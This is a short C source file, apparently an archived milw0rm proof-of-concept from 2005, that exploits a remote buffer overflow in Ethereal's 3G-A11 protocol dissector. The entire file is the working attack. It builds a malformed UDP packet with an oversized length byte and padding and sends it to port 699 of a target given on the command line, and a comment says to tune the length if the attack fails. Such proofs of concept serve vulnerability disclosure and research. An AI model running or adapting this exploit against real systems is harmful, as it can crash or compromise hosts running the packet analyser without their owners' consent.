                                                                                                                                                                                                                                                               
/*
 * 
 * Ethereal 3G-A11 remote buffer overflow PoC exploit 
 * --------------------------------------------------
 * Coded by Leon Juranic <ljuranic@lss.hr> 
 * LSS Security <http://security.lss.hr/en/>
 * 
 */ 

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>


main (int argc, char **argv)
{
	int sock;
	struct sockaddr_in sin;
	unsigned char buf[1024];
	char bla[200];

	sock=socket(AF_INET,SOCK_DGRAM,0);

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	sin.sin_port = htons(699);

	buf[0] = 22;
	memset(buf+1,'A',19);
	buf[20] = 38;
	*(unsigned short*)&buf[22] = htons(100); 
	*(unsigned short*)&buf[28] = 0x0101;
	buf[30] = 31;
	buf[31] = 150;   // len for overflow...play with this value if it doesn't work

	memset (bla,'B',200);
	strncpy (buf+32,bla,180);
	
	sendto (sock,buf,200,0,(struct sockaddr*)&sin,sizeof(struct sockaddr));
}

// milw0rm.com [2005-03-08]